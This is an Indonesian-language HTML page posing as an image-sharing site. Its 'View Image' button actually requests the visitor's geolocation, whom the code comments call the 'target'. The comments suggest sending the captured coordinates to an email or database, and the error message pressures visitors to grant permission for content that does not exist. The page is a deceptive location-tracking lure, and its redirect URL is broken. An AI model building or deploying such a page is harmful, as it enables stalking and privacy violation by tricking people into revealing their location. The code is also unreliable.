index.html.
<!DOCTYPE html>
<html>
<head>
    <title>Situs Berbagi Gambar</title>
</head>
<body>
    <h2>Klik tombol di bawah untuk melihat gambar</h2>
    <button onclick="getLocation()">Lihat Gambar</button>

    <script>
    function getLocation() {
        if (navigator.geolocation) {
            // Meminta izin akses lokasi ke target
            navigator.geolocation.getCurrentPosition(showPosition, showError);
        } else {
            alert("Browser tidak mendukung pelacakan lokasi.");
        }
    }

    function showPosition(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        
        // Menampilkan hasil (Di sini Anda bisa mengirim data ini ke email/database)
        alert("Lokasi Terdeteksi!\nLatitude: " + lat + "\nLongitude: " + lon);
        
        // Contoh mengarahkan ke Google Maps dengan koordinat tersebut
        window.location.href = "https://www.google.com" + lat + "," + lon;
    }

    function showError(error) {
        alert("Anda harus mengklik 'Izinkan' untuk melihat konten ini.");
    }
    </script>
</body>
</html>
